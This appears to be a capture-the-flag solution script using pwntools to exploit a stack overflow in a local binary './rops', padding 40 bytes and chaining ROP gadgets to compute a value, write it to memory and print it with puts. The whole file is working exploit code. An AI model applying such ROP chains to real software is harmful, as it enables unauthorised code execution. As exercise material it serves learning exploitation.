from pwn import *

# Set the binary file
binary = "./rops"

# Create a process
p = process(binary)

payload = b"A" * 40  # Padding to reach the return address

#--------------------addresses
writable_addr=p32(0x0810c2c0)
printf_addr= p32(0x08052230)
save_mem= p32(0x0806614a)
push_eax= p32(0x080cf43a)
pop_eax= p32(0x080cf49a) # pop eax ; ret
pop_ecx = p32(0x080915f3) #pop ecx ; ret
mov_eax_ecx = p32(0x080a187b) #mov eax ecx
mov_ptr_ecx_eax = p32(0x0808d8f9)  #mov dword ptr [ecx], eax ; pop ebx ; ret
pop_edx= p32(0x080b1145)
format_str_addr = p32(0x080abcd0)  # Address of "%d" format string
xchg_ecx_eax=p32(0x0806ba7b)
writable_addr=p32(0x0810c2f0) #p32(0x0810c2f0)
#------------------------

payload +=pop_eax
payload+=p32(0x00000001)
payload+=pop_ecx
payload+=p32(0x00000000)

for _ in range(12):
	payload+= p32(0x08075044)  #add eax and ecx
	payload+= xchg_ecx_eax  #xchg ecx, eax ; ret

payload+=pop_edx
payload+=writable_addr
payload+=p32(0xdeadbeef)
payload+=xchg_ecx_eax
payload+=save_mem

payload+=p32(0x0805f4b0)  # this is puts func
payload+=p32(0x00000000)
payload+=writable_addr


# Send the payload to the binary
p.sendline(payload)
data=p.recvall().strip().split()[-1]
#print(data)
print(ord(data))
